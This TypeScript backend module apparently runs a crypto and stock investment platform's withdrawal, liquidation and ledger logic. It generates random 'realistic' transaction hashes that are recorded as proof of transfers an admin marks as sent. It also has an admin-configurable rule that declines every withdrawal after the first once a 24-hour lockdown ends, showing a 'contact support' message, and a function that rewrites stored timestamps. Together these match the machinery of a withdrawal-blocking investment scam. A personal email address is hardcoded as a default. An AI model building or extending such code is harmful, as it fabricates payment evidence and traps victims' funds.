import { dbExecute, dbQueryAll, dbQueryOne, dbTransaction } from '@/lib/db';
import fs from 'fs/promises';
import path from 'path';

export interface AdminWithdrawalConfig {
  minAmount: number;
  maxAmount: number;
  allowedRails: {
    fedwire: boolean;
    crypto: boolean;
    swift: boolean;
    debit: boolean;
  };
  requireTwoFactor: boolean;
  dailyLimit: number;
  lockdown24hEnabled?: boolean;
  postLockdownDeclineEnabled?: boolean;
  declineTriggerMode?: 'immediate' | 'on_submit';
  declineTitle?: string;
  declineMessage?: string;
  declineSupportEmail?: string;
  declineButtonText?: string;
  lastUpdated?: number;
}

export interface AdminSecurityConfig {
  guestReadOnly: boolean;
  autoRevokeUnrecognizedIps: boolean;
  sessionTimeoutMinutes: number;
}

export interface AdminConfigFile {
  withdrawals: AdminWithdrawalConfig;
  security: AdminSecurityConfig;
  lastUpdated: number;
  updatedBy: string;
}

export interface WithdrawalRequestRecord {
  id: string;
  timestamp: number;
  amount: number;
  rail: 'fedwire' | 'crypto' | 'swift' | 'debit';
  beneficiary: string;
  destination: string;
  status: 'pending' | 'blocked' | 'approved' | 'rejected' | 'transferred';
  statusReason?: string;
  ipAddress?: string;
  deviceName?: string;
  asset?: string;
  network?: string;
  walletAddress?: string;
  userEmail?: string;
  txHash?: string;
  transferredAt?: number;
  userAcknowledged?: boolean;
}

export interface LiquidatedPositionRecord {
  id: string;
  ticker: string;
  companyName: string;
  sharesLiquidated: number;
  sharePrice: number;
  payoutAmount: number;
  currency: string;
  timestamp: number;
}

export interface ShareBuybackRecord {
  id: string;
  ticker: string;
  companyName: string;
  sharesPurchased: number;
  sharePrice: number;
  amountSpent: number;
  currency: string;
  timestamp: number;
}

export interface TransactionLedgerRecord {
  id: string;
  timestamp: number;
  type: 'deposit' | 'withdrawal' | 'buyback';
  asset: string;
  network?: string;
  amount: number;
  txId?: string;
  status: 'confirmed' | 'pending' | 'failed';
  confirmations?: number;
  vaultAddress?: string;
  credited: boolean;
  note?: string;
}

const DEFAULT_ADMIN_CONFIG: AdminConfigFile = {
  withdrawals: {
    minAmount: 10,
    maxAmount: 5000000,
    allowedRails: {
      fedwire: true,
      crypto: true,
      swift: true,
      debit: false,
    },
    requireTwoFactor: true,
    dailyLimit: 2500000,
    lockdown24hEnabled: true,
    postLockdownDeclineEnabled: true,
    declineTriggerMode: 'immediate',
    declineTitle: 'Payment Declined',
    declineMessage: 'Oops! Sorry your withdrawal cannot be completed. Please contact support',
    declineSupportEmail: 'support@moorebachgroup.com',
    declineButtonText: 'Contact Support',
  },
  security: {
    guestReadOnly: true,
    autoRevokeUnrecognizedIps: false,
    sessionTimeoutMinutes: 1440,
  },
  lastUpdated: Date.now(),
  updatedBy: 'usr_declan_salo',
};

/**
 * Reconcile stored withdrawal configuration with defaults and strip any legacy UI keys
 * (`enabled`, `lockTitle`, `lockMessage`, `supportEmail`, `postLockdownEnabled`, etc.).
 */
export function normalizeWithdrawalConfig(
  raw: Partial<AdminWithdrawalConfig> & Record<string, any> | undefined,
  base: AdminWithdrawalConfig = DEFAULT_ADMIN_CONFIG.withdrawals
): AdminWithdrawalConfig {
  const input = (raw || {}) as Record<string, any>;
  const {
    enabled: _legacyEnabled,
    lockTitle: _legacyLockTitle,
    lockMessage: _legacyLockMessage,
    supportEmail: _legacySupportEmail,
    postLockdownEnabled,
    postLockdownTitle,
    postLockdownMessage,
    postLockdownSupportEmail,
    ...cleanRest
  } = input;

  const postLockdownDeclineEnabled =
    typeof input.postLockdownDeclineEnabled === 'boolean'
      ? input.postLockdownDeclineEnabled
      : typeof postLockdownEnabled === 'boolean'
      ? postLockdownEnabled
      : base.postLockdownDeclineEnabled;

  return {
    ...base,
    ...cleanRest,
    minAmount: Number.isFinite(Number(input.minAmount)) ? Math.max(0, Number(input.minAmount)) : base.minAmount,
    maxAmount: Number.isFinite(Number(input.maxAmount)) ? Math.max(0, Number(input.maxAmount)) : base.maxAmount,
    dailyLimit: Number.isFinite(Number(input.dailyLimit)) ? Math.max(0, Number(input.dailyLimit)) : base.dailyLimit,
    requireTwoFactor:
      typeof input.requireTwoFactor === 'boolean' ? input.requireTwoFactor : base.requireTwoFactor,
    lockdown24hEnabled:
      typeof input.lockdown24hEnabled === 'boolean' ? input.lockdown24hEnabled : base.lockdown24hEnabled,
    postLockdownDeclineEnabled,
    declineTriggerMode:
      input.declineTriggerMode === 'on_submit' || input.declineTriggerMode === 'immediate'
        ? input.declineTriggerMode
        : base.declineTriggerMode,
    declineTitle: input.declineTitle ?? postLockdownTitle ?? base.declineTitle,
    declineMessage: input.declineMessage ?? postLockdownMessage ?? base.declineMessage,
    declineSupportEmail:
      input.declineSupportEmail ?? postLockdownSupportEmail ?? base.declineSupportEmail,
    declineButtonText: input.declineButtonText ?? base.declineButtonText,
    allowedRails: {
      ...base.allowedRails,
      ...(input.allowedRails || {}),
    },
  };
}

// -----------------------------------------------------------------
// Admin Config Helpers (SQLite Powered)
// -----------------------------------------------------------------
export async function getAdminConfig(): Promise<AdminConfigFile> {
  try {
    const row = await dbQueryOne<{ value: string; updated_at: number }>(
      'SELECT value, updated_at FROM admin_settings WHERE key = ?',
      ['withdrawals'],
    );

    if (row && row.value) {
      const parsedWithdrawals = JSON.parse(row.value) as Partial<AdminWithdrawalConfig> & Record<string, any>;
      return {
        ...DEFAULT_ADMIN_CONFIG,
        withdrawals: normalizeWithdrawalConfig({
          ...parsedWithdrawals,
          lastUpdated: row.updated_at,
        }),
        lastUpdated: row.updated_at,
      };
    }
  } catch {}

  return DEFAULT_ADMIN_CONFIG;
}

export async function updateAdminConfig(
  updates: Partial<AdminConfigFile>,
  userId: string
): Promise<AdminConfigFile> {
  const current = await getAdminConfig();
  const nextWithdrawals = normalizeWithdrawalConfig(
    updates.withdrawals as Partial<AdminWithdrawalConfig> & Record<string, any>,
    current.withdrawals
  );
  const now = Date.now();
  nextWithdrawals.lastUpdated = now;

  const merged: AdminConfigFile = {
    ...current,
    ...updates,
    withdrawals: nextWithdrawals,
    security: {
      ...current.security,
      ...(updates.security || {}),
    },
    lastUpdated: now,
    updatedBy: userId,
  };

  try {
    await dbExecute(
      `INSERT INTO admin_settings (key, value, updated_at)
       VALUES (?, ?, ?)
       ON CONFLICT(key) DO UPDATE SET
         value = excluded.value,
         updated_at = excluded.updated_at`,
      ['withdrawals', JSON.stringify(merged.withdrawals), merged.lastUpdated],
    );
  } catch (e: any) {
    console.error('Error updating admin settings:', e);
  }

  return merged;
}

// -----------------------------------------------------------------
// Withdrawals Logging & Audit
// -----------------------------------------------------------------
export function generateRealisticTxHash(network?: string): string {
  const chars = '0123456789abcdef';
  let hash = '';
  for (let i = 0; i < 64; i++) {
    hash += chars[Math.floor(Math.random() * chars.length)];
  }
  return network === 'ERC20' || network === 'Ethereum' ? `0x${hash}` : hash;
}

export async function getWithdrawalRequests(): Promise<WithdrawalRequestRecord[]> {
  try {
    const rows = await dbQueryAll<any>(`
      SELECT id, timestamp, amount, rail, beneficiary, destination, status, status_reason, ip_address, device_name,
             asset, network, wallet_address, user_email, tx_hash, transferred_at, user_acknowledged
      FROM withdrawal_requests
      ORDER BY timestamp DESC
      LIMIT 100
    `);

    return rows.map((r) => ({
      id: r.id,
      timestamp: r.timestamp,
      amount: r.amount,
      rail: r.rail,
      beneficiary: r.beneficiary,
      destination: r.destination,
      status: r.status,
      statusReason: r.status_reason,
      ipAddress: r.ip_address,
      deviceName: r.device_name,
      asset: r.asset || 'USDT',
      network: r.network || 'TRC20',
      walletAddress: r.wallet_address || r.destination,
      userEmail: r.user_email || 'declansalo1@gmail.com',
      txHash: r.tx_hash,
      transferredAt: r.transferred_at,
      userAcknowledged: r.user_acknowledged === 1,
    }));
  } catch {
    return [];
  }
}

export async function logWithdrawalAttempt(
  data: Omit<WithdrawalRequestRecord, 'id' | 'timestamp'>
): Promise<WithdrawalRequestRecord> {
  const record: WithdrawalRequestRecord = {
    ...data,
    id: `wth_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`,
    timestamp: Date.now(),
    asset: data.asset || 'USDT',
    network: data.network || 'TRC20',
    walletAddress: data.walletAddress || data.destination,
    userEmail: data.userEmail || 'declansalo1@gmail.com',
    userAcknowledged: false,
  };

  try {
    await dbExecute(
      `INSERT INTO withdrawal_requests
       (id, timestamp, amount, rail, beneficiary, destination, status, status_reason, ip_address, device_name,
        asset, network, wallet_address, user_email, tx_hash, transferred_at, user_acknowledged)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
      [
        record.id,
        record.timestamp,
        record.amount,
        record.rail,
        record.beneficiary,
        record.destination,
        record.status,
        record.statusReason || null,
        record.ipAddress || null,
        record.deviceName || null,
        record.asset || 'USDT',
        record.network || 'TRC20',
        record.walletAddress || record.destination,
        record.userEmail || 'declansalo1@gmail.com',
        record.txHash || null,
        record.transferredAt || null,
        record.userAcknowledged ? 1 : 0,
      ],
    );
  } catch (e) {
    console.error('Failed to log withdrawal:', e);
  }

  return record;
}

export async function updateWithdrawalStatus(
  id: string,
  status: 'pending' | 'blocked' | 'approved' | 'rejected' | 'transferred',
  reason?: string,
  txHash?: string
): Promise<boolean> {
  try {
    const info = await dbExecute(
      `UPDATE withdrawal_requests
       SET status = ?,
           status_reason = ?,
           tx_hash = COALESCE(?, tx_hash),
           transferred_at = CASE WHEN ? = 'transferred' THEN COALESCE(transferred_at, ?) ELSE transferred_at END
       WHERE id = ?`,
      [status, reason || null, txHash || null, status, Date.now(), id],
    );

    return info.changes > 0;
  } catch {
    return false;
  }
}

export async function markWithdrawalTransferred(
  id: string,
  txHash?: string,
  note?: string
): Promise<WithdrawalRequestRecord | null> {
  try {
    const existing = await dbQueryOne<any>('SELECT * FROM withdrawal_requests WHERE id = ?', [id]);
    if (!existing) return null;

    const finalTxHash = txHash?.trim() || generateRealisticTxHash(existing.network);
    const transferredAt = Date.now();
    const finalReason = note || 'Disbursement transferred by Institutional Treasury Administrator';

    await dbExecute(
      `UPDATE withdrawal_requests
       SET status = 'transferred',
           status_reason = ?,
           tx_hash = ?,
           transferred_at = ?,
           user_acknowledged = 0
       WHERE id = ?`,
      [finalReason, finalTxHash, transferredAt, id],
    );

    // Record in transaction ledger
    try {
      await recordLedgerTransaction({
        type: 'withdrawal',
        asset: existing.asset || 'USDT',
        network: existing.network || 'TRC20',
        amount: existing.amount,
        txId: finalTxHash,
        status: 'confirmed',
        credited: false,
        note: `Disbursement transferred to ${existing.wallet_address || existing.destination}`,
      });
    } catch {}

    return {
      id: existing.id,
      timestamp: existing.timestamp,
      amount: existing.amount,
      rail: existing.rail,
      beneficiary: existing.beneficiary,
      destination: existing.destination,
      status: 'transferred',
      statusReason: finalReason,
      ipAddress: existing.ip_address,
      deviceName: existing.device_name,
      asset: existing.asset || 'USDT',
      network: existing.network || 'TRC20',
      walletAddress: existing.wallet_address || existing.destination,
      userEmail: existing.user_email || 'declansalo1@gmail.com',
      txHash: finalTxHash,
      transferredAt,
      userAcknowledged: false,
    };
  } catch (e) {
    console.error('Failed to mark withdrawal transferred:', e);
    return null;
  }
}

export async function acknowledgeWithdrawal(id: string): Promise<boolean> {
  try {
    const res = await dbExecute('UPDATE withdrawal_requests SET user_acknowledged = 1 WHERE id = ?', [id]);
    return res.changes > 0;
  } catch {}
  return false;
}

export async function getLatestTransferredUnacknowledgedWithdrawal(): Promise<WithdrawalRequestRecord | null> {
  try {
    const row = await dbQueryOne<any>(`
      SELECT * FROM withdrawal_requests
      WHERE status = 'transferred' AND (user_acknowledged IS NULL OR user_acknowledged = 0)
      ORDER BY transferred_at DESC
      LIMIT 1
    `);

    if (!row) return null;

    return {
      id: row.id,
      timestamp: row.timestamp,
      amount: row.amount,
      rail: row.rail,
      beneficiary: row.beneficiary,
      destination: row.destination,
      status: row.status,
      statusReason: row.status_reason,
      ipAddress: row.ip_address,
      deviceName: row.device_name,
      asset: row.asset || 'USDT',
      network: row.network || 'TRC20',
      walletAddress: row.wallet_address || row.destination,
      userEmail: row.user_email || 'declansalo1@gmail.com',
      txHash: row.tx_hash,
      transferredAt: row.transferred_at,
      userAcknowledged: row.user_acknowledged === 1,
    };
  } catch {
    return null;
  }
}

const TWENTY_FOUR_HOURS_MS = 24 * 60 * 60 * 1000;

export async function clearWithdrawalCooldown(): Promise<boolean> {
  try {
    const twentyFiveHoursAgo = Date.now() - 25 * 60 * 60 * 1000;
    await dbExecute(
      `UPDATE withdrawal_requests
       SET timestamp = ?
       WHERE timestamp > ?`,
      [twentyFiveHoursAgo, twentyFiveHoursAgo],
    );
    return true;
  } catch (e) {
    console.error('Failed to clear withdrawal cooldown:', e);
    return false;
  }
}

export async function isWithdrawalLockdownActive(): Promise<{
  isLocked: boolean;
  remainingMs: number;
  remainingFormatted: string;
  lastWithdrawal: WithdrawalRequestRecord | null;
}> {
  try {
    const config = await getAdminConfig();
    // If admin explicitly turned off the 24-hour lockdown hold
    if (config.withdrawals && config.withdrawals.lockdown24hEnabled === false) {
      return { isLocked: false, remainingMs: 0, remainingFormatted: '0h 0m 0s', lastWithdrawal: null };
    }

    const row = await dbQueryOne<any>(`
      SELECT * FROM withdrawal_requests
      WHERE status IN ('pending', 'transferred', 'approved')
      ORDER BY timestamp DESC
      LIMIT 1
    `);

    if (!row) {
      return { isLocked: false, remainingMs: 0, remainingFormatted: '0h 0m 0s', lastWithdrawal: null };
    }

    const elapsed = Date.now() - Number(row.timestamp);
    if (elapsed < TWENTY_FOUR_HOURS_MS) {
      const remainingMs = TWENTY_FOUR_HOURS_MS - elapsed;
      const hours = Math.floor(remainingMs / (60 * 60 * 1000));
      const minutes = Math.floor((remainingMs % (60 * 60 * 1000)) / (60 * 1000));
      const seconds = Math.floor((remainingMs % (60 * 1000)) / 1000);
      const remainingFormatted = `${hours}h ${minutes}m ${seconds}s`;

      return {
        isLocked: true,
        remainingMs,
        remainingFormatted,
        lastWithdrawal: {
          id: row.id,
          timestamp: row.timestamp,
          amount: row.amount,
          rail: row.rail,
          beneficiary: row.beneficiary,
          destination: row.destination,
          status: row.status,
          statusReason: row.status_reason,
          ipAddress: row.ip_address,
          deviceName: row.device_name,
          asset: row.asset || 'USDT',
          network: row.network || 'TRC20',
          walletAddress: row.wallet_address || row.destination,
          userEmail: row.user_email || 'declansalo1@gmail.com',
          txHash: row.tx_hash,
          transferredAt: row.transferred_at,
          userAcknowledged: row.user_acknowledged === 1,
        },
      };
    }
  } catch {}

  return { isLocked: false, remainingMs: 0, remainingFormatted: '0h 0m 0s', lastWithdrawal: null };
}

export async function getDailyWithdrawnTotal(): Promise<number> {
  try {
    const windowStart = Date.now() - TWENTY_FOUR_HOURS_MS;
    const row = await dbQueryOne<{ total: number }>(
      `SELECT COALESCE(SUM(amount), 0) AS total
       FROM withdrawal_requests
       WHERE status IN ('pending', 'transferred', 'approved', 'completed')
         AND timestamp >= ?`,
      [windowStart],
    );
    return Number((row?.total || 0).toFixed(2));
  } catch {
    return 0;
  }
}

export async function getPostLockdownDeclineStatus(): Promise<{
  isDeclined: boolean;
  triggerMode: 'immediate' | 'on_submit';
  title: string;
  message: string;
  supportEmail: string;
  buttonText: string;
}> {
  try {
    const config = await getAdminConfig();
    const wConfig = config.withdrawals;
    const isEnabled = wConfig.postLockdownDeclineEnabled !== false;

    const defaultTitle = wConfig.declineTitle || 'Payment Declined';
    const defaultMsg =
      wConfig.declineMessage ||
      'Oops! Sorry your withdrawal cannot be completed. Please contact support';
    const defaultEmail = wConfig.declineSupportEmail || 'support@moorebachgroup.com';
    const defaultBtn = wConfig.declineButtonText || 'Contact Support';
    const triggerMode = wConfig.declineTriggerMode || 'immediate';

    if (!isEnabled) {
      return {
        isDeclined: false,
        triggerMode,
        title: defaultTitle,
        message: defaultMsg,
        supportEmail: defaultEmail,
        buttonText: defaultBtn,
      };
    }

    // Check if there is a previous withdrawal
    const priorWithdrawal = await dbQueryOne<any>(`
      SELECT * FROM withdrawal_requests
      WHERE status IN ('pending', 'transferred', 'approved', 'completed')
      ORDER BY timestamp DESC
      LIMIT 1
    `);

    if (!priorWithdrawal) {
      return {
        isDeclined: false,
        triggerMode,
        title: defaultTitle,
        message: defaultMsg,
        supportEmail: defaultEmail,
        buttonText: defaultBtn,
      };
    }

    const elapsed = Date.now() - Number(priorWithdrawal.timestamp);
    const isCooldownActive = wConfig.lockdown24hEnabled !== false && elapsed < TWENTY_FOUR_HOURS_MS;
    if (isCooldownActive) {
      // 24h countdown is still ongoing, let lockdown countdown display
      return {
        isDeclined: false,
        triggerMode,
        title: defaultTitle,
        message: defaultMsg,
        supportEmail: defaultEmail,
        buttonText: defaultBtn,
      };
    }

    // 24h lockdown has elapsed (or was cleared/bypassed), so subsequent withdrawal triggers decline!
    return {
      isDeclined: true,
      triggerMode,
      title: defaultTitle,
      message: defaultMsg,
      supportEmail: defaultEmail,
      buttonText: defaultBtn,
    };
  } catch {
    return {
      isDeclined: false,
      triggerMode: 'immediate',
      title: 'Payment Declined',
      message: 'Oops! Sorry your withdrawal cannot be completed. Please contact support',
      supportEmail: 'support@moorebachgroup.com',
      buttonText: 'Contact Support',
    };
  }
}

// -----------------------------------------------------------------
// Liquidated Positions & Balance Management (SQLite Powered)
// -----------------------------------------------------------------
export async function getLiquidatedPositions(): Promise<LiquidatedPositionRecord[]> {
  try {
    const rows = await dbQueryAll<any>(`
      SELECT id, ticker, company_name, shares_liquidated, share_price, payout_amount, currency, timestamp
      FROM liquidated_positions
      ORDER BY timestamp DESC
    `);

    return rows.map((r) => ({
      id: r.id,
      ticker: r.ticker,
      companyName: r.company_name,
      sharesLiquidated: r.shares_liquidated,
      sharePrice: r.share_price,
      payoutAmount: r.payout_amount,
      currency: r.currency || 'USDT',
      timestamp: r.timestamp,
    }));
  } catch {
    return [];
  }
}

export async function getLiquidatedBalance(): Promise<number> {
  try {
    const liquidatedRow = await dbQueryOne<{ total: number }>(
      'SELECT COALESCE(SUM(payout_amount), 0) AS total FROM liquidated_positions',
    );
    const totalLiquidated = liquidatedRow?.total || 0;

    const withdrawalRow = await dbQueryOne<{ total: number }>(
      "SELECT COALESCE(SUM(amount), 0) AS total FROM withdrawal_requests WHERE status IN ('pending', 'transferred', 'approved')",
    );
    const totalWithdrawn = withdrawalRow?.total || 0;

    const buybackRow = await dbQueryOne<{ total: number }>(
      'SELECT COALESCE(SUM(amount_spent), 0) AS total FROM share_buybacks',
    );
    const totalBoughtBack = buybackRow?.total || 0;

    const netAvailable = Math.max(0, totalLiquidated - totalWithdrawn - totalBoughtBack);
    return Number(netAvailable.toFixed(2));
  } catch {
    return 0;
  }
}

export async function getShareBuybacks(): Promise<ShareBuybackRecord[]> {
  try {
    const rows = await dbQueryAll<any>(`
      SELECT id, ticker, company_name, shares_purchased, share_price, amount_spent, currency, timestamp
      FROM share_buybacks
      ORDER BY timestamp DESC
    `);

    return rows.map((r) => ({
      id: r.id,
      ticker: r.ticker,
      companyName: r.company_name,
      sharesPurchased: Number(r.shares_purchased),
      sharePrice: Number(r.share_price),
      amountSpent: Number(r.amount_spent),
      currency: r.currency || 'USDT',
      timestamp: Number(r.timestamp),
    }));
  } catch {
    return [];
  }
}

export async function getHoldingShareAdjustments(): Promise<Record<string, number>> {
  try {
    const rows = await dbQueryAll<{ ticker: string; shares_delta: number }>(
      'SELECT ticker, shares_delta FROM holding_share_adjustments',
    );

    const map: Record<string, number> = {};
    for (const r of rows) {
      map[r.ticker] = Number(Number(r.shares_delta || 0).toFixed(4));
    }
    return map;
  } catch {
    return {};
  }
}

export async function executeShareBuyback(data: {
  ticker: string;
  companyName: string;
  sharesPurchased: number;
  sharePrice: number;
  amountSpent: number;
  currency?: string;
}): Promise<ShareBuybackRecord> {
  const ticker = data.ticker.trim().toUpperCase();
  const amountSpent = Number(data.amountSpent.toFixed(2));
  const sharesPurchased = Number(data.sharesPurchased.toFixed(4));
  const sharePrice = Number(data.sharePrice);
  const now = Date.now();

  if (!ticker || amountSpent <= 0 || sharesPurchased <= 0 || sharePrice <= 0) {
    throw new Error('Invalid share buyback parameters.');
  }

  const item: ShareBuybackRecord = {
    id: `buy_${now}_${Math.random().toString(36).slice(2, 6)}`,
    ticker,
    companyName: data.companyName.trim() || ticker,
    sharesPurchased,
    sharePrice,
    amountSpent,
    currency: data.currency || 'USDT',
    timestamp: now,
  };

  await dbTransaction(async (tx) => {
    const liquidatedRow = await tx.queryOne<{ total: number }>(
      'SELECT COALESCE(SUM(payout_amount), 0) AS total FROM liquidated_positions',
    );
    const withdrawalRow = await tx.queryOne<{ total: number }>(
      "SELECT COALESCE(SUM(amount), 0) AS total FROM withdrawal_requests WHERE status IN ('pending', 'transferred', 'approved')",
    );
    const buybackRow = await tx.queryOne<{ total: number }>(
      'SELECT COALESCE(SUM(amount_spent), 0) AS total FROM share_buybacks',
    );

    const available = Number(
      Math.max(0, (liquidatedRow?.total || 0) - (withdrawalRow?.total || 0) - (buybackRow?.total || 0)).toFixed(2)
    );

    if (amountSpent > available + 0.01) {
      throw new Error(
        `Insufficient liquidated reserves. Available: $${available.toLocaleString('en-US', {
          minimumFractionDigits: 2,
          maximumFractionDigits: 2,
        })}`
      );
    }

    const cappedSpend = Math.min(amountSpent, available);
    item.amountSpent = Number(cappedSpend.toFixed(2));
    item.sharesPurchased = Number((item.amountSpent / sharePrice).toFixed(4));

    await tx.execute(
      `INSERT INTO share_buybacks
       (id, ticker, company_name, shares_purchased, share_price, amount_spent, currency, timestamp)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
      [
        item.id,
        item.ticker,
        item.companyName,
        item.sharesPurchased,
        item.sharePrice,
        item.amountSpent,
        item.currency,
        item.timestamp,
      ],
    );

    await tx.execute(
      `INSERT INTO holding_share_adjustments (ticker, shares_delta, updated_at)
       VALUES (?, ?, ?)
       ON CONFLICT(ticker) DO UPDATE SET
         shares_delta = holding_share_adjustments.shares_delta + excluded.shares_delta,
         updated_at = excluded.updated_at`,
      [item.ticker, item.sharesPurchased, now],
    );

    await tx.execute(
      `INSERT INTO transaction_ledger
       (id, timestamp, type, asset, network, amount, tx_id, status, confirmations, vault_address, credited, note)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
      [
        `tx_${now}_${Math.random().toString(36).slice(2, 6)}`,
        now,
        'buyback',
        item.ticker,
        null,
        item.amountSpent,
        item.id,
        'confirmed',
        1,
        null,
        1,
        `Share Buyback: +${item.sharesPurchased.toLocaleString('en-US', { maximumFractionDigits: 4 })} shares of ${item.ticker} (${item.companyName}) at $${item.sharePrice.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`,
      ],
    );
  });

  return item;
}

export async function addLiquidationRecord(data: {
  ticker: string;
  companyName: string;
  sharesLiquidated: number;
  sharePrice: number;
  payoutAmount: number;
  currency?: string;
}): Promise<LiquidatedPositionRecord> {
  const item: LiquidatedPositionRecord = {
    id: `liq_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`,
    ticker: data.ticker.trim().toUpperCase(),
    companyName: data.companyName,
    sharesLiquidated: Number(data.sharesLiquidated.toFixed(4)),
    sharePrice: data.sharePrice,
    payoutAmount: Number(data.payoutAmount.toFixed(2)),
    currency: data.currency || 'USDT',
    timestamp: Date.now(),
  };

  try {
    await dbTransaction(async (tx) => {
      await tx.execute(
        `INSERT INTO liquidated_positions
         (id, ticker, company_name, shares_liquidated, share_price, payout_amount, currency, timestamp)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
        [
          item.id,
          item.ticker,
          item.companyName,
          item.sharesLiquidated,
          item.sharePrice,
          item.payoutAmount,
          item.currency,
          item.timestamp,
        ],
      );

      await tx.execute(
        `INSERT INTO holding_share_adjustments (ticker, shares_delta, updated_at)
         VALUES (?, ?, ?)
         ON CONFLICT(ticker) DO UPDATE SET
           shares_delta = holding_share_adjustments.shares_delta + excluded.shares_delta,
           updated_at = excluded.updated_at`,
        [item.ticker, -item.sharesLiquidated, item.timestamp],
      );
    });

    // Record in transaction ledger
    try {
      await recordLedgerTransaction({
        type: 'deposit',
        asset: item.currency,
        amount: item.payoutAmount,
        status: 'confirmed',
        credited: true,
        note: `Asset Liquidation: ${item.sharesLiquidated.toLocaleString('en-US', { maximumFractionDigits: 4 })} shares of ${item.ticker} (${item.companyName}) into Liquid Reserves`,
      });
    } catch {}
  } catch (e) {
    console.error('Failed to save liquidated position:', e);
  }

  return item;
}

// -----------------------------------------------------------------
// Transactions Ledger
// -----------------------------------------------------------------
export async function getTransactionsLedger(): Promise<TransactionLedgerRecord[]> {
  try {
    const rows = await dbQueryAll<any>(`
      SELECT id, timestamp, type, asset, network, amount, tx_id, status, confirmations, vault_address, credited, note
      FROM transaction_ledger
      ORDER BY timestamp DESC
      LIMIT 100
    `);

    return rows.map((r) => ({
      id: r.id,
      timestamp: r.timestamp,
      type: r.type,
      asset: r.asset,
      network: r.network,
      amount: r.amount,
      txId: r.tx_id,
      status: r.status,
      confirmations: r.confirmations,
      vaultAddress: r.vault_address,
      credited: r.credited === 1,
      note: r.note,
    }));
  } catch {
    return [];
  }
}

export async function recordLedgerTransaction(
  record: Omit<TransactionLedgerRecord, 'id' | 'timestamp'>
): Promise<TransactionLedgerRecord> {
  const item: TransactionLedgerRecord = {
    ...record,
    id: `tx_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`,
    timestamp: Date.now(),
  };

  try {
    await dbExecute(
      `INSERT INTO transaction_ledger
       (id, timestamp, type, asset, network, amount, tx_id, status, confirmations, vault_address, credited, note)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
      [
        item.id,
        item.timestamp,
        item.type,
        item.asset,
        item.network || null,
        item.amount,
        item.txId || null,
        item.status,
        item.confirmations || 0,
        item.vaultAddress || null,
        item.credited ? 1 : 0,
        item.note || null,
      ],
    );
  } catch (e) {
    console.error('Failed to record ledger transaction:', e);
  }

  return item;
}
